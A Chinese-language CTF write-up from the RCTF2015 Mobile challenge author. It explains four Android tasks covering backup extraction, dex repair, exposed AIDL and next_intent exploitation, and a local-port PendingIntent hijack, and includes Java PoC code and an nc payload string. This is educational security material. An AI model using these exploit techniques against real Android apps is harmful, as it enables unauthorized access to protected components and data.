# RCTF2015-Mobile-出题思路及Writeup

@Xbalien ROIS

从最初CTF上apk的简单反编译到现在各种加固逆向，难度已经上升了好多个级别。但感觉除了ACTF，多数的Mobile题目还是以逆向为主。此次作为ROIS成员有幸能参与到RCTF2015的出题工作中，于是尝试了一些新的出题思路，导致大家做题都很不适应，也把大家坑了一波。欢迎建议、意见、吐槽。

**这次RCTF单独了一个Mobile类别，主题是漏洞，希望和大家一起探讨。**

0x00 Mobile100-FlagSystem
=========================

* * *

> Show me the flag. (The flag should include RCTF{}).[ab_2e204fe0ec33b1689f1c47bd60a9770c](https://github.com/Xbalien/RCTF2015-MOBILE/blob/master/FlagSystem/ab_2e204fe0ec33b1689f1c47bd60a9770c)

出题思路：Android backup漏洞 + 本地密码弱保护
-------------------------------

该题给出了一个修改过的backup.ab，稍微需改了ab的头部，version以及compress。直接使用abe进行提取的话需要根据代码简单修复一下ab头部。提取出来后发现有两个备份apk文件。

com.example.mybackup  
com.example.zi

其中mybackup里提供了一个经过sqlcipher加密过的BOOKS.db.该数据库里存储了flag，只要解密该数据库之后即可获取flag。

密码直接可以通过反编译看到：

```
public BooksDB(Context context) {
    super(context, "BOOKS.db", null, 1);
    this.k = Test.getSign(context);
    this.db = this.getWritableDatabase(this.k);
    this.dbr = this.getReadableDatabase(this.k);
}

```

getSign为自己写的获取签名，然后计算"SHA1",直接利用jeb反编译结果编写代码即可获取key,然后坑点就是要选择尝试正确的sqlcipher版本进行解密即可。

```
sqlite> PRAGMA KEY = 'KEY';
sqlite> .schema
CREATE TABLE android_metadata (locale TEXT);
CREATE TABLE books_table (book_id INTEGER primary key autoincrement, book_name t
ext, book_author text);
sqlite> select * from books_table

```

或者利用backup的apk中提供的sqlcipher库进行重写读取数据库也是可以获取到BOOKS.db内容。

0x01 Mobile200-Where
====================

* * *

> Where is the flag.(The flag should include RCTF{})[misc_5b0a7ae29fe01c7a76a19503e1e0273e](https://github.com/Xbalien/RCTF2015-MOBILE/blob/master/Where/misc_5b0a7ae29fe01c7a76a19503e1e0273e)

出题思路：炸弹引爆 + dex结构修复
-------------------

该题的定位是杂项题，给了一个apk，但apk啥都没做。在assets目录下存在了一个abc文件，打开后可以看到是损坏的dex header，只要根据dex header其他相关结构把各id_size都修复。

剩下就是要寻找到隐藏起来的dex body.参考聚安全博客[[1]](http://jaq.alibaba.com/blog.htm?spm=0.0.0.0.v5UAtC&id=76)，我在META-INF目录里隐藏了一个y，并把加密的dexbody以及相关加密信息KEY=Misc@inf0#fjhx11.DEX=en(dex body)，aes-128-cbc存放在CERT.RSA尾部，这样一来主apk是能正常安装的。

其实这道题目我描述的不太清楚，坑了一波，所谓的KEY其实只是openssl的-pass，通过KEY生成真正的key以及iv。

通过相关的openssl操作`openssl enc -aes-128-cbc -d -kMisc@inf0#fjhx11 -nosalt -in xxx -out xxx2`将dex body解密后与dex header进行拼接，jeb反编译后结果如下：

```
public class MainActivity extends ActionBarActivity {
    public String seed;

    public MainActivity() {
        super();
        this.seed = "m3ll0t_yetFLag";
    }

    protected void onCreate(Bundle savedInstanceState) {
    }

    ...
}

```

这题我把onCreate方法的code insns扣了出来，查看assembly：

```
.method protected onCreate(Bundle)V
      .registers 8
      .param p1, "savedInstanceState"
00000000  nop
      .prologue
00000002  nop
00000004  nop
00000006  nop
00000008  nop
0000000A  nop
0000000C  nop
0000000E  nop
00000010  nop
00000012  nop
00000014  nop
00000016  nop
00000018  nop
0000001A  nop
0000001C  nop
0000001E  nop
00000020  nop
      .local v1, strb:Ljava/lang/StringBuilder;
00000022  nop

```

通过判断长度可以知道y其实就是扣出来的code insns.直接覆盖在次反编译可以看到onCreate方法中对seed进行了一些修改，最终得到最后flag.

0x02 Mobile350-Load
===================

* * *

> This APK has a vulnerability,Can you load the flag? Try it.[WaWaWa_0bb98521a9f21cc3672774cfec9c7140](https://github.com/Xbalien/RCTF2015-MOBILE/blob/master/Load/WaWaWa_0bb98521a9f21cc3672774cfec9c7140)

出题思路：暴露组件aidl利用 + next_intent
-----------------------------

该题的出题思路是在某次自己参加众测中积累的。该题都在强调Load，通过反编译apk，发现有一个Load类，声明了很多native方法，然后WebActivity中调用了一个loadUrl来加载网页。该题本意是通过正确调用的loadUrl，加载flag网址获取flag。

但为了增加逆向难度,APK启动后会检测一下so的调用者，flag放在vps,增加了so-java来回jni交互的逻辑，最后加上了娜迦的so加固。如果真是逆向做出来的，真的是不得不服了。

该题在放出提示exposed component exploit后，复旦六星战队在比赛结束那个时间获得了flag，但最终没有按时提交flag比较遗憾。

Manifest:normal权限保护CoreService,未导出组件WebActivity,导出组件MiscService

```
<permission android:name="com.example.wawawa.permission.CORE_SERVICE" android:protectionLevel="normal" />
<activity android:name=".WebActivity" />
<service android:name=".MiscService">
    <intent-filter>
        <action android:name="com.example.wawawa.Misc_SERVICE" />
    </intent-filter>
</service>
<service android:name=".CoreService" android:permission="com.example.wawawa.permission.CORE_SERVICE">
    <intent-filter>
        <action android:name="com.example.wawawa.CORE_SERVICE" />
    </intent-filter>
</service>

```

WebActivity：通过接收处理一个传递过来的序列化对象，作为Load.decode的参数可以进行flagUrl的解码，之后加载解码后的网页进而获取flag，但该组件未导出.

```
public void onCreate(Bundle arg6) {
    super.onCreate(arg6);
    this.setContentView(2130903068);
    this.a = this.findViewById(2131034173);
    this.a.setWebViewClient(new g(this));
    Serializable v0 = this.getIntent().getSerializableExtra("KEY");
    if(v0 == null || !(v0 instanceof b)) {
        Toast.makeText(((Context)this), "flag is null", 1).show();
    }
    else {
        String v1 = ((b)v0).a();
        String v2 = ((b)v0).b();
        if("loading".equals(((b)v0).c())) {
            if(v1 != null && v2 != null) {
                this.a.loadUrl(Load.decode(((Context)this), v1, v2, a.a));
                Toast.makeText(((Context)this), "flag loading ...", 1).show();
                return;
            }

            this.a.loadUrl("file:///android_asset/666");
        }
    }
}

```

MiscService:存在next_intent特征，可以控制CLASS_NAME启动组件

```
public Intent a(Intent arg4) {
    Intent v0 = new Intent();
    v0.setClassName(this.getApplicationContext(), arg4.getStringExtra("CLASS_NAME"));
    v0.putExtras(arg4);
    v0.setFlags(268435456);
    return v0;
}

```

CoreService:存在暴露的AIDL接口,多处使用了Load的native方法。

```
class b extends a {
    b(CoreService arg1) {
        this.a = arg1;
        super();
    }

    public String a() throws RemoteException {
        c v0 = new c(Load.getUrl(this.a), Load.getToken(this.a));
        Thread v1 = new Thread(((Runnable)v0));
        v1.start();
        try {
            v1.join();
        }
        catch(InterruptedException v1_1) {
            v1_1.printStackTrace();
        }

        return v0.a();
    }

    public String b() throws RemoteException {
        return null;
    }

    public String c() throws RemoteException {
        return Load.getIv(this.a);
    }
}

```

因此，通过仔细分析及猜测逻辑，这个核心服务提供了两个接口: 一个接口通过调用Load的native函数getUrl以及getToken，获取vps-url以及token参数,post到vps-url,若token正确即可获取key. 另一个接口通过Load.getIv自己本地获取了iv. 因此通过直接利用该暴露了aidl接口可以轻松获得des解密需要的key和iv.

POC如下：

```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_bind);
    try {
        ComponentName com = new ComponentName("com.example.wawawa", "com.example.wawawa.CoreService");  
        Intent intent = new Intent();
        intent.setComponent(com);
        bindService(intent, connD, Context.BIND_AUTO_CREATE);
    } catch (Exception e) {
    }

}

private d da;

private ServiceConnection connD = new ServiceConnection() {

    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        da = d.Stub.asInterface(service);

        try {
            System.out.println(da.c());
            System.out.println(da.a());
        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onServiceDisconnected(ComponentName name) {
        // TODO Auto-generated method stub
    }

};

```

接着，通过next_intent传递key和iv,即可开启webActivity，des解密成功后，加载正确flagUrl。获取flag。

```
String key = etKey.getText().toString();
String iv = etIv.getText().toString();
String content = "loading";
b data = new b(key,iv, content);
Intent intent = new Intent("com.example.wawawa.Misc_SERVICE");
intent.putExtra("CLASS_NAME", "com.example.wawawa.WebActivity");
intent.putExtra("KEY", data);
startService(intent);

```

0x03 Mobile450-Target
=====================

* * *

> This APK has a vulnerability, please use it to start the target activity.The flag should include RCTF{}.[Package_b6411947d3b360182e8897be40064023](https://github.com/Xbalien/RCTF2015-MOBILE/blob/master/Target/Package_b6411947d3b360182e8897be40064023)

出题思路：开放本地端口 + PendingIntent + 运行时自窜改
------------------------------------

该题出题思路参考了@小荷才露尖尖角的浅谈Android开放网络端口的安全风险[[2]](http://drops.wooyun.org/mobile/6973)，X-team的PendingIntent双无intent可导致的能力泄露[[3]](http://xteam.baidu.com/?p=77)以及运行时自篡改代码[[4]](http://blog.csdn.net/freshui/article/details/13620647)。

出题本意是，通过该apk开放的一个本地端口，传递相关参数，最后触发主dex中的PendingIntent双无Intent的通知，获取相关通知后修改intent内容开启TargetActivty.其中向端口中传递的能够正确触发双无Intent的参数的md5(输入参数)即为flag。（但dex几处代码经过so的自篡改，因此需要获取真正加载的代码）

Manifest：TargetActiviy使用了signature的权限进行保护

```
<permission android:name="com.example.packagedetail.permission.TARGET" android:protectionLevel="signature" />

    <activity android:name="com.ui.TargetActivity" android:permission="com.example.packagedetail.permission.TARGET">
        <intent-filter>
            <action android:name="com.example.packagedetail.TAEGET" />
            <category android:name="android.intent.category.DEFAULT" />
        </intent-filter>
    </activity>

```

因此，想要启用该activity需要有next-intent或者能力泄露，通过查看ListenService定位到了一处双无intent。因此触发ListenService逻辑至allow代码逻辑即可（allow逻辑代码是13年开发的重打包加固的app中修改的[[5]](https://github.com/Xbalien/GuardDroid)）。

```
Intent v2_1 = new Intent();
if("reject".equals(arg9)) {
    v2_1.setClassName(this.a, "com.ui.MainTabHostActivity");
    v1.setLatestEventInfo(this.a.getApplicationContext(), "Guard", ((CharSequence)arg10), 
            PendingIntent.getActivity(this.a, 0, v2_1, 0));
    ((NotificationManager)v0).notify(1, v1);
    Log.d("CoreListenService", arg9);
}
if("allow".equals(arg9)) {
    v1.setLatestEventInfo(this.a.getApplicationContext(), "Guard", ((CharSequence)arg10), 
            PendingIntent.getActivity(this.a, 0, v2_1, 0));
    ((NotificationManager)v0).notify(1, v1);
    Log.d("CoreListenService", arg9);
}

```

该逻辑是，在内存中存在一个设定了allow的条件，就是name为test,perm为READ_F的消息才能被设置为allow。

```
if(GuardApplication.a.get("test") == null) {
        GuardApplication.a.put("test", Integer.valueOf(0));
    }

GuardApplication.a.put("test", Integer.valueOf(b.b.get("READ_F").intValue() | GuardApplication
        .a.get("test").intValue()));

```

但listenService是未导出组件，无法直接调用，因此只能另寻他路。

在apk assets目录下存放了一个d文件，该文件其实是加密后的dex文件。通过查看加载调用GuardApplication可以发现：

首先通过b()对d复制、解密操作，解密之后加载com.example.dynamic.Init类，执行其中的a方法。 b()最终是异或36，但是该异或代码在运行时加载的so中进行了修改，异或了18，因此通过36异或出来的d并不是真正的dex。加载后的dex以及odex我也删除掉了。

```
public void a() {
    this.b();
    String v1 = this.e.getCacheDir().getPath();
    DexClassLoader v0 = new DexClassLoader(String.valueOf(this.e.getDir(Load.b, 0).getPath()) + 
            "/" + Load.d, v1, null, this.e.getClassLoader());
    try {
        Class v0_2 = v0.loadClass("com.example.dynamic.Init");
        Constructor v2 = v0_2.getConstructor(Context.class);
        Method v0_3 = v0_2.getMethod("a");
        this.f = v2.newInstance(this.e);
        v0_3.invoke(this.f);
    }
    catch(Exception v0_1) {
        v0_1.printStackTrace();
    }

    new File(v1, "bb.dex").delete();
    new File(this.e.getDir(Load.b, 0).getPath(), "bb.jar").delete();
}

```

so存在简单的ptrace以及traceid反调试，想办法获取到d.dex后，进行反编译：可以知道该dex加载后开启了127.0.0.1：20151端口。处于监听状态获取数据交互。

```
public ServerSocketThread(Context arg2) {
    super();
    this.c = arg2;
    this.b = 20151;
}

public final void run() {
    try {
        this.a = new ServerSocket();
        this.a.bind(new InetSocketAddress(InetAddress.getLocalHost(), this.b));
        while(true) {
            Socket v0_1 = this.a.accept();
            Log.d("socket", "Socket Acccept!Address=" + v0_1.getInetAddress().toString());
            if(v0_1 != null) {
                new b(this.c, v0_1).start();
            }

            Log.d("socket", "Socket Execute Thread Started!Address=" + v0_1.getInetAddress().toString());
        }
    }
    catch(Exception v0) {
        v0.printStackTrace();
        return;
    }
}

```

其中，处理逻辑中，找到一处可以通过接受端口传递进来的参数，进行不同的逻辑处理，最后解析参数触发startservice，调用主dex中任意service以及extras的逻辑。

```
public class a {
    public static final String b = "mobile://rois/?";

    static {
        a.a = new HashMap();
        a.a.put("start", Integer.valueOf(3));
        a.a.put("handle", Integer.valueOf(4));
        a.a.put("test", Integer.valueOf(1));
        a.a.put("location", Integer.valueOf(2));
        a.a.put("getinfo", Integer.valueOf(5));
        a.a.put("sms", Integer.valueOf(6));
        a.a.put("contact", Integer.valueOf(7));
    }

    public a() {
        super();
    }
}

```

因此，`nc 127.0.0.1 20151`，向该端口传递数据，尝试触发该逻辑，以下逻辑为需要触发的逻辑。接受参数后，会对`xx=xx&xx=xx&xx=xx`之类的输入，进行解析。获取到相关的输入数据后，构造特定的Intent，包括组件名，extras数据等等，最后通过startservice将intent传递到主dex的逻辑中。

```
label_184:
    if(!v1[1].startsWith("cm=")) {
        goto label_93;
    }

    if(!v1[2].startsWith("ac=")) {
        goto label_93;
    }

    if(!v1[3].startsWith("extr=")) {
        goto label_93;
    }

    v0_4 = v2.getQueryParameter("cm");
    v1_1 = v2.getQueryParameter("ac");
    String v2_2 = v2.getQueryParameter("extr");
    Intent v3_1 = new Intent();
    if(v0_4 != null) {
        v3_1.setComponent(new ComponentName(this.a, v0_4));
    }

    if(("true".equals(v1_1)) && v2_2 != null) {
        System.out.println(v2_2);
        v0_5 = v2_2.split("-");
        if(v0_5.length == 6) {
            v3_1.putExtra(v0_5[0], v0_5[1]);
            v3_1.putExtra(v0_5[2], v0_5[3]);
            v3_1.putExtra(v0_5[4], v0_5[5]);
        }
    }

    this.a.startService(v3_1);

```

触发调用listenService的逻辑后，intent根据相关解析相关逻辑约束，在满足某约束的输入下，进而发送双无intent的通知。该输入MD5就是所谓的flag。

（但在ListenService中我留了一个坑，v1.getString("perm", "per")，其中key "perm"我在so自篡改成了PERM）。

```
public int onStartCommand(Intent arg5, int arg6, int arg7) {
    if(arg5 != null) {
        Bundle v1 = arg5.getExtras();
        Iterator v2 = v1.keySet().iterator();
        while(v2.hasNext()) {
            v2.next();
        }

        if(v1 != null) {
            String v0 = v1.getString("name", "name");
            if("log".equals(v1.getString("action", "act"))) {
                this.b = new com.service.ListenService$b(this, ((Context)this), v0, v1.getString(
                        "perm", "per"));
                this.c = new Thread(this.b);
                this.c.start();
            }
        }
    }

    return super.onStartCommand(arg5, arg6, arg7);
}

```

因此向监听端口发送：`action=start&cm=com.service.ListenService&ac=true&extr=name-test-action-log-PERM-READ_F`

即可触发allow通知，该通知存放一个双无intent.再通过修改intent即可触发TargetActivity.

ps:自己反编译混淆后的apk才发现看得还是挺蛋疼的，又坑了大家一波。

0x04 小结
=======

* * *

此次RCTF2015 Mobile类题目，我尝试了一些漏洞的思路进行出题，也许还会存在我没有考虑到的问题，也或许获取flag的方式让大家不解，包括让大家入坑的都请见谅哈。希望有兴趣童鞋可以尝试把Mobile的CTF题出得更全面、更有意思。

最后。参加RCTF的小伙伴们。

0x05 参考
=======

* * *

1.  [http://jaq.alibaba.com/blog.htm?spm=0.0.0.0.v5UAtC&id=76](http://jaq.alibaba.com/blog.htm?spm=0.0.0.0.v5UAtC&id=76)
2.  [http://drops.wooyun.org/mobile/6973](http://drops.wooyun.org/mobile/6973)
3.  [http://xteam.baidu.com/?p=77](http://xteam.baidu.com/?p=77)
4.  [http://blog.csdn.net/freshui/article/details/13620647](http://blog.csdn.net/freshui/article/details/13620647)
5.  [https://github.com/Xbalien/GuardDroid](https://github.com/Xbalien/GuardDroid)